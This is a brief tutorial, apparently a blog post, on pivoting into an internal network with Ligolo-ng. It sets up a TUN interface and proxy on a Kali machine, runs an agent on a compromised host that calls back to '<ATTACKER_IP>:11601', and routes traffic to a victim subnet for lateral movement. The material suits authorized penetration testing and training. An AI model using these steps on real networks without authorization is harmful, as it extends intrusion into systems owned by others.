Traditional pivoting (like SSH dynamic forwarding) often feels like driving with the parking brake on—you’re limited by proxychains and slow TCP overhead. Ligolo-ng changes the game by creating a TUN interface, effectively placing your attack machine directly inside the victim’s internal network.

Architecture overview#

ligolo-ng works on a Client/Server model.

Proxy#

Runs on your Attacker machine (Kali). It manages the tunnel and routing.

Agent (The Client):#

Runs on the Compromised Host (the “Pivot”). It calls back to your proxy.

Setting up attacker machine#

Before you can receive a connection, you must prepare your OS to handle the incoming tunnel.

Create a TUN Interface#

This creates a virtual network adapter on your Kali machine dedicated to Ligolo.

sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up

Launch the Proxy#

Start the listener using a self-signed certificate for speed.

./proxy -selfcert

Establishing the foothold#

Once you have a shell on your first target, you need to get the agent binary onto that machine.

Transfer the Agent#

Upload the correct binary (Windows/Linux) to the target.

Connect Back#

Run the agent to establish the reverse tunnel to your Kali IP.

# On the compromised host
./agent -connect <ATTACKER_IP>:11601 -ignore-cert

Routing and Lateral Movement#

This is where the magic happens. Once the agent connects, you will see a “Session” notification in your Proxy terminal.

Select the Session#

Inside the ligolo-ng proxy interface:

# select the session, if the session is 1:
session 1
start

Add the Route#

You now need to tell your Kali Linux kernel to send traffic for the internal network through the ligolo interface. _Suppose the internal network is 172.16.5.0/24.

# Open a new terminal on Kali
sudo ip route add 172.16.5.0/24 dev ligolo

Pivoting#

You are now “inside.”! You no longer need to prefix commands with proxychains. You can run tools as if the internal network was directly connected to your machine.
